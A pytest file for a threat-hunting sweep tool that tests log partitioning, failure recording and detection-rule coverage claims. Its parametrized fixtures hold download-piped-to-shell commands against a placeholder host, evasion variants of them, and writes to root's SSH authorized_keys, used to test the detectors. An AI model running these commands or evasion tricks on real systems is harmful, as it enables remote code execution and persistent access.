"""Sweep partitioning: capped partitions subdivide until complete; failures stay visible."""
from datetime import UTC, datetime, timedelta

import pytest

from romulus.hunt import sweep as sw
from romulus.evidence.typed import Outcome, RawRef, TypedEvent, fv
from romulus.sources.models import Completeness, SearchOutcome, Window
from romulus.store.db import make_engine, migrate
from romulus.store.repo import Repo

START = datetime(2024, 11, 18, 14, 0, tzinfo=UTC)


class FakeClient:
    version = "test"

    class settings:  # noqa: N801
        es_flavor = "elasticsearch"


def _repo():
    e = make_engine(":memory:")
    migrate(e)
    r = Repo(e)
    r.create_hunt("h1", {"targets": ["romulus-host-x"]}, "d", "t")
    return r


def test_capped_partitions_split_until_complete(monkeypatch):
    calls = []

    def fake_execute(client, intent, contract):
        span = intent.window.end - intent.window.start
        calls.append(span)
        now = datetime.now(UTC)
        if span > timedelta(minutes=5):        # dense burst: anything wider than 5 min exceeds the cap
            return SearchOutcome(target=intent.target, fingerprint="f", started_at=now, ended_at=now,
                                 completeness=Completeness.partial, reasons=["cap:1000<total:5000"], total=5000,
                                 total_relation="eq", returned=1000, records=[])
        return SearchOutcome(target=intent.target, fingerprint="f", started_at=now, ended_at=now,
                             completeness=Completeness.complete, total=0, total_relation="eq", returned=0, records=[])

    monkeypatch.setattr(sw, "execute", fake_execute)
    repo = _repo()
    s = sw.Sweep(repo, FakeClient(), "h1", Window(start=START, end=START + timedelta(minutes=40)), {"romulus-host-x": None})
    s.run_partition("romulus-host-x", None, [], Window(start=START, end=START + timedelta(minutes=40)), est=100)
    assert s.partial_reasons == []
    states = [t["state"] for t in repo.tasks("h1")]
    # 40 -> 2x20 -> 4x10 -> 8x5-minute leaves: 1 + 2 + 4 = 7 splits, 8 evaluated leaves
    assert states.count("split") == 7 and states.count("evaluated") == 8
    leaves = [c["partition"] for c in repo.rule_cells("h1")]
    assert leaves and all("partial" not in c["state"] for c in repo.rule_cells("h1"))


def test_presplit_uses_exact_histogram_count(monkeypatch):
    seen = []

    def fake_execute(client, intent, contract):
        seen.append(intent.window)
        now = datetime.now(UTC)
        return SearchOutcome(target=intent.target, fingerprint="f", started_at=now, ended_at=now,
                             completeness=Completeness.complete, total=0, total_relation="eq", returned=0, records=[])

    monkeypatch.setattr(sw, "execute", fake_execute)
    repo = _repo()
    s = sw.Sweep(repo, FakeClient(), "h1", Window(start=START, end=START + timedelta(minutes=5)), {"x": None})
    s.run_partition("x", None, [], Window(start=START, end=START + timedelta(minutes=5)),
                    est=sw.PARTITION_MAX_DOCS * 3)
    assert len(seen) == 4 and all(w.end > w.start for w in seen)       # split before any fetch


def test_failed_partition_is_recorded_not_dropped(monkeypatch):
    def fake_execute(client, intent, contract):
        now = datetime.now(UTC)
        return SearchOutcome(target=intent.target, fingerprint="f", started_at=now, ended_at=now,
                             completeness=Completeness.failed, reasons=["source_error"], error="HTTP 503")

    monkeypatch.setattr(sw, "execute", fake_execute)
    repo = _repo()
    s = sw.Sweep(repo, FakeClient(), "h1", Window(start=START, end=START + timedelta(minutes=5)), {"x": None})
    s.run_partition("x", None, [], Window(start=START, end=START + timedelta(minutes=5)), est=10)
    assert s.partial_reasons and all(c["state"] == "executed_failed" for c in repo.rule_cells("h1"))


def test_partition_heartbeats_before_and_after_source_execution(monkeypatch):
    calls = []

    def fake_execute(client, intent, contract):
        calls.append("execute")
        return _complete(intent, [])

    monkeypatch.setattr(sw, "execute", fake_execute)
    repo = _repo()
    sweep = sw.Sweep(
        repo, FakeClient(), "h1", Window(start=START, end=START + timedelta(minutes=5)),
        {"x": None}, heartbeat=lambda: calls.append("heartbeat"),
    )

    sweep.run_partition(
        "x", None, [], Window(start=START, end=START + timedelta(minutes=5)), est=0,
    )

    assert calls == ["heartbeat", "execute", "heartbeat"]


# ---------------------------------------------------------------- M1 gate regressions (B2, B3, B5)
def _complete(intent, records):
    now = datetime.now(UTC)
    return SearchOutcome(target=intent.target, fingerprint="f", started_at=now, ended_at=now,
                         completeness=Completeness.complete, total=len(records), total_relation="eq",
                         returned=len(records), records=records)


def test_aggregate_rules_with_zero_evaluated_are_not_complete_negatives(monkeypatch):
    monkeypatch.setattr(sw, "execute", lambda client, intent, contract: _complete(intent, []))
    repo = _repo()
    s = sw.Sweep(repo, FakeClient(), "h1", Window(start=START, end=START + timedelta(minutes=5)), {"x": None})
    s.run_partition("x", None, [], Window(start=START, end=START + timedelta(minutes=5)), est=0)
    s.finalize()
    window_cells = {c["rule_id"]: c["state"] for c in repo.rule_cells("h1") if c["target"] == "*"}
    assert window_cells and "no_match_complete" not in window_cells.values()
    assert set(window_cells.values()) == {"not_applicable_no_events"}


def test_report_coverage_never_complete_with_unexecuted_or_missing_work():
    from romulus.report.manifest import _coverage
    done = {"rule_id": "r", "target": "a", "partition": "p1", "state": "no_match_complete", "evaluated": 10}
    planned = {"rule_id": "r", "target": "a", "partition": "p2", "state": "planned", "evaluated": 0}
    split = {"rule_id": "r", "target": "a", "partition": "p0", "state": "split", "evaluated": 0}
    claim = lambda cells, **kw: _coverage(cells, **kw)["rules"][0]["negative_claim"]  # noqa: E731
    assert claim([done, split], targets=["a"]) == "complete"
    assert claim([done, planned], targets=["a"]).startswith("unresolved")
    assert "target(s) ['b']" in claim([done], targets=["a", "b"])
    assert "sweep did not finish" in claim([done], targets=["a"], sweep_finished=False)
    never = _coverage([done], targets=["a"], rule_ids=["r", "other"])["rules"]
    assert [r["negative_claim"] for r in never if r["rule_id"] == "other"][0].startswith("unresolved")


def test_positive_only_and_matched_claims_retain_all_coverage_caveats():
    from romulus.report.manifest import _coverage

    partial = {
        "rule_id": "positive", "target": "a", "partition": "p1",
        "state": "positive_only_partial", "evaluated": 1,
    }
    failed = {
        "rule_id": "positive", "target": "a", "partition": "p2",
        "state": "executed_failed", "evaluated": 0,
    }
    positive = _coverage(
        [partial, failed], targets=["a", "b"], sweep_finished=False,
    )["rules"][0]["negative_claim"]

    assert positive.startswith("not assessable by design")
    assert "sweep did not finish" in positive
    assert "target(s) ['b']" in positive
    assert "positive_only_partial=1" in positive
    assert "executed_failed=1" in positive

    matched = dict(partial, state="matched")
    matched_claim = _coverage(
        [matched, failed], targets=["a", "b"], sweep_finished=False,
    )["rules"][0]["negative_claim"]

    assert matched_claim.startswith("none (rule matched)")
    assert "sweep did not finish" in matched_claim
    assert "target(s) ['b']" in matched_claim
    assert "executed_failed=1" in matched_claim


def test_target_planning_failure_is_recorded_and_other_targets_continue(monkeypatch):
    def boom(*a, **k):
        raise RuntimeError("histogram shard failure")
    monkeypatch.setattr(sw, "plan_partitions", boom)
    repo = _repo()
    s = sw.Sweep(repo, FakeClient(), "h1", Window(start=START, end=START + timedelta(minutes=5)), {"x": None})
    s.run_target("x")                      # must not raise
    assert s.partial_reasons and all(c["state"] == "executed_failed" for c in repo.rule_cells("h1"))


def test_firewall_drop_citations_resolve_on_a_fresh_database(monkeypatch):
    from romulus.report.manifest import build_manifest
    execve = 'type=EXECVE msg=audit(1731940424.829:9001): argc=7 a0="iptables" a1="-A" a2="INPUT" ' \
             'a3="-s" a4="192.0.2.65" a5="-j" a6="DROP"'
    syscall = 'type=SYSCALL msg=audit(1731940424.829:9001): arch=c000003e syscall=59 success=yes exit=0 ' \
              'ppid=10 pid=11 auid=0 uid=0 euid=0 comm="iptables" exe="/usr/sbin/iptables" key=(null)'
    recs = [{"_id": f"r{i}", "_index": "romulus-host-x", "_source": {
        "@timestamp": "2024-11-18T14:33:44.829Z", "message": raw, "host": {"name": "video"},
        "event": {"dataset": "linux.audit", "original": raw}}} for i, raw in enumerate((execve, syscall))]
    monkeypatch.setattr(sw, "execute", lambda client, intent, contract: _complete(intent, recs))
    repo = _repo()
    repo.set_hunt_state("h1", "running")
    w = Window(start=START, end=START + timedelta(minutes=40))
    s = sw.Sweep(repo, FakeClient(), "h1", w, {"romulus-host-x": None})
    s.run_partition("romulus-host-x", None, [], w, est=2)
    s.finalize()
    fw = [c for c in repo.candidates("h1") if c["rule_id"] == "host.firewall_rule_change_command"
          and c["lane"] == "high"]
    assert len(fw) == 1
    from romulus.report import manifest as rm
    cites = rm._citations(repo, fw[0])
    assert cites and all(c["status"] == "retained" for c in cites), cites
    assert build_manifest is not None


def test_audit_errors_make_only_process_rules_partial(monkeypatch):
    bad = {"_id": "bad", "_index": "romulus-host-x", "_source": {
        "@timestamp": "2024-11-18T14:00:01Z", "message": "type=EXECVE garbage", "host": {"name": "video"},
        "event": {"dataset": "linux.audit", "original": "type=EXECVE garbage"}}}
    monkeypatch.setattr(sw, "execute", lambda client, intent, contract: _complete(intent, [bad]))
    repo = _repo()
    s = sw.Sweep(repo, FakeClient(), "h1", Window(start=START, end=START + timedelta(minutes=5)), {"x": None})
    s.run_partition("romulus-host-x", None, [], Window(start=START, end=START + timedelta(minutes=5)), est=1)
    cells = {c["rule_id"]: c["state"] for c in repo.rule_cells("h1")}
    assert cells["host.credential_store_read"] == "evaluated_partial"        # process_exec rule
    assert cells["net.suricata_alert_stack"] == "not_applicable_no_events"   # unaffected family
    assert s.partial_reasons                                                  # hunt still records it


def _shell_event(script=None, argv=None):
    return TypedEvent(
        id="shell-event", family="process_exec", ts=START, host="video", outcome=Outcome.success,
        fields={"process.argv": fv(argv or ["bash", "-c", script], "fixture:argv")},
        raw=[RawRef(target="romulus-host-x", native_id="raw")], normalizer="fixture",
    )


def _run_shell_partition(monkeypatch, *, script=None, argv=None):
    record = {"_id": "raw", "_index": "romulus-host-x", "_source": {"fixture": True}}
    monkeypatch.setattr(sw, "execute", lambda client, intent, contract: _complete(intent, [record]))
    monkeypatch.setattr(sw, "normalize_hits", lambda records: ([_shell_event(script, argv)], {}, []))
    repo = _repo()
    sweep = sw.Sweep(
        repo, FakeClient(), "h1", Window(start=START, end=START + timedelta(minutes=5)),
        {"romulus-host-x": None},
    )
    sweep.run_partition(
        "romulus-host-x", None, [], Window(start=START, end=START + timedelta(minutes=5)), est=1,
    )
    return repo


@pytest.mark.parametrize("script", [
    "curl http://e/x | sh; echo $'it\\'s'",
    "x=$(curl http://e/x | sh)",
    "true # don't edit\ncat > /tmp/README <<EOF\ncurl http://e/install | sh\nEOF",
    'true # comment has "\ncat > /tmp/README <<EOF\ncurl http://e/install | sh\nEOF',
    "true # don't edit\ncat > /tmp/README <<EOF\necho key >> /root/.ssh/authorized_keys\nEOF",
    "true # it's fine\nx=$(curl http://e/x | sh)",
    r"echo $'x\' ; curl http://e | sh ; echo \''\'",
])
def test_unevaluable_shell_script_makes_rule_cells_partial(monkeypatch, script):
    repo = _run_shell_partition(monkeypatch, script=script)

    cells = {cell["rule_id"]: cell for cell in repo.rule_cells("h1")}
    # script-text rules are positive-only: an unevaluable script is never a complete negative and the
    # unevaluable count is still recorded
    assert cells["host.download_piped_to_shell"]["state"] == "positive_only_partial"
    assert cells["host.ssh_authorized_keys_write"]["state"] == "positive_only_partial"
    assert cells["host.download_piped_to_shell"]["detail"]["missing_required"] == 1
    assert cells["host.ssh_authorized_keys_write"]["detail"]["missing_required"] == 1
    assert not [candidate for candidate in repo.candidates("h1") if candidate["rule_id"] in {
        "host.download_piped_to_shell", "host.ssh_authorized_keys_write",
    }]


@pytest.mark.parametrize("argv", [
    ["bash", "-c", r"echo \;# ; curl http://e/x | sh"],
    ["bash", "-c", r"echo \ # ; curl http://e/x | sh"],
    ["bash", "-c", "echo x\u00a0# ; curl http://e/x | sh"],
    ["bash", "-c", r"echo $'\'' ; curl http://e/x | sh #'"],
    ["bash", "-c", "curl${IFS}http://e/x|sh"],
    ["bash", "-c", "LC_ALL=C curl http://e/x | sh"],
    ["bash", "-c", "if true; then curl http://e/x | sh; fi"],
    ["bash", "-c", "cu\\\nrl http://e/x | sh"],
    ["bash", "-c", "echo key 2 > /root/.ssh/authorized_keys"],
    ["bash", "-c", "echo key &>> /root/.ssh/authorized_keys"],
    ["bash", "-c", "echo key >& /root/.ssh/authorized_keys"],
    ["bash", "-c", "--", "curl http://e/x | sh"],
    ["bash", "-c", "-x", "curl http://e/x | sh"],
    ["bash", "-o", "pipefail", "-c", "curl http://e/x | sh"],
    ["busybox", "sh", "-c", "curl http://e/x | sh"],
    ["bash", "-c", "(curl http://e/x | sh)"],
    ["bash", "-c", "{ curl http://e/x | sh; }"],
    ["bash", "-c", 'eval "curl http://e/x | sh"'],
    ["bash", "-c", "bash <(curl http://e/x)"],
])
def test_adversarial_shell_construct_never_persists_complete_negative_for_both_rules(monkeypatch, argv):
    repo = _run_shell_partition(monkeypatch, argv=argv)

    cells = {cell["rule_id"]: cell for cell in repo.rule_cells("h1")}
    assert cells["host.download_piped_to_shell"]["state"] != "no_match_complete"
    assert cells["host.ssh_authorized_keys_write"]["state"] != "no_match_complete"


def test_sequence_pair_split_across_partitions_keeps_all_raw_copies(monkeypatch):
    # N3 (gate re-review): downloader in partition 1, interpreter in partition 2, same parent
    def rec(rid, raw, ts):
        return {"_id": rid, "_index": "romulus-host-x", "_source": {
            "@timestamp": ts, "message": raw, "host": {"name": "video"},
            "event": {"dataset": "linux.audit", "original": raw}}}
    p1 = [rec("d1", 'type=EXECVE msg=audit(1731938698.000:7001): argc=2 a0="curl" a1="http://192.0.2.7/x"',
              "2024-11-18T14:04:58Z"),
          rec("d2", 'type=SYSCALL msg=audit(1731938698.000:7001): syscall=59 success=yes ppid=500 pid=501 '
                    'comm="curl" exe="/usr/bin/curl"', "2024-11-18T14:04:58Z")]
    p2 = [rec("s1", 'type=EXECVE msg=audit(1731938701.000:7002): argc=1 a0="sh"', "2024-11-18T14:05:01Z"),
          rec("s2", 'type=SYSCALL msg=audit(1731938701.000:7002): syscall=59 success=yes ppid=500 pid=502 '
                    'comm="sh" exe="/usr/bin/dash"', "2024-11-18T14:05:01Z")]
    batches = iter([p1, p2])
    monkeypatch.setattr(sw, "execute", lambda client, intent, contract: _complete(intent, next(batches)))
    repo = _repo()
    s = sw.Sweep(repo, FakeClient(), "h1", Window(start=START, end=START + timedelta(minutes=10)), {"x": None})
    s.run_partition("romulus-host-x", None, [], Window(start=START, end=START + timedelta(minutes=5)), est=2)
    s.run_partition("romulus-host-x", None, [], Window(start=START + timedelta(minutes=5),
                                                        end=START + timedelta(minutes=10)), est=2)
    s.finalize()
    from romulus.report import manifest as rm
    seq = [c for c in repo.candidates("h1") if c["rule_id"] == "host.downloader_feeds_interpreter"]
    assert len(seq) == 1
    cites = rm._citations(repo, seq[0])
    assert len(cites) == 4 and all(c["status"] == "retained" for c in cites), cites


def test_aggregate_consume_time_match_is_never_a_complete_negative(monkeypatch):
    # F8 (gate): host.web_service_spawns_interpreter publishes indicator events during consume()
    raw = 'type=EXECVE msg=audit(1731938400.000:8101): argc=3 a0="bash" a1="-c" a2="/usr/bin/zmpkg.pl start; id"'
    sc = ('type=SYSCALL msg=audit(1731938400.000:8101): syscall=59 success=yes ppid=1 pid=2 uid=33 comm="bash" '
          'exe="/usr/bin/bash"\x1dUID="www-data" EUID="www-data"')
    recs = [{"_id": f"w{i}", "_index": "romulus-host-x", "_source": {
        "@timestamp": "2024-11-18T14:00:00Z", "message": r, "host": {"name": "video"},
        "event": {"dataset": "linux.audit", "original": r}}} for i, r in enumerate((raw, sc))]
    monkeypatch.setattr(sw, "execute", lambda client, intent, contract: _complete(intent, recs))
    repo = _repo()
    repo.set_hunt_state("h1", "running")
    w = Window(start=START, end=START + timedelta(minutes=5))
    s = sw.Sweep(repo, FakeClient(), "h1", w, {"romulus-host-x": None})
    s.run_partition("romulus-host-x", None, [], w, est=2)
    s.finalize()
    pub = [c for c in repo.candidates("h1") if c["rule_id"] == "host.web_service_spawns_interpreter"
           and c["lane"] != "context"]
    assert pub, "fixture should publish an indicator match"
    from romulus.report.manifest import _coverage
    row = next(r for r in _coverage(repo.rule_cells("h1"), targets=["romulus-host-x"])["rules"]
               if r["rule_id"] == "host.web_service_spawns_interpreter")
    assert row["negative_claim"].startswith("none (rule matched)"), row



def test_script_text_rules_never_claim_a_complete_negative(monkeypatch):
    # option 2 (owner decision 2026-10-18): even a fully parsed, clean script cannot prove absence
    repo = _run_shell_partition(monkeypatch, script="echo hello; ls /tmp")
    from romulus.report.manifest import _coverage
    rows = {r["rule_id"]: r for r in _coverage(repo.rule_cells("h1"), targets=["romulus-host-x"])["rules"]}
    for rid in ("host.download_piped_to_shell", "host.ssh_authorized_keys_write"):
        assert rows[rid]["negative_claim"].startswith("not assessable by design"), rows[rid]
    assert "host.downloader_feeds_interpreter" in rows["host.download_piped_to_shell"]["negative_claim"]
    assert "no process-level assurance exists" in rows["host.ssh_authorized_keys_write"]["negative_claim"]
    assert rows["host.credential_store_read"]["negative_claim"] == "complete"     # process-level rule still assures


def test_temp_script_operand_rule_is_positive_only_for_unmodelled_interpreter_options(monkeypatch):
    repo = _run_shell_partition(monkeypatch, argv=["python3", "-W", "ignore", "/tmp/x.py"])

    from romulus.report.manifest import _coverage
    row = next(
        item for item in _coverage(repo.rule_cells("h1"), targets=["romulus-host-x"])["rules"]
        if item["rule_id"] == "host.script_from_temp_dir"
    )

    assert row["states"] == {"positive_only": 1}
    assert row["negative_claim"].startswith("not assessable by design")
    assert "interpreter argv" in row["negative_claim"]
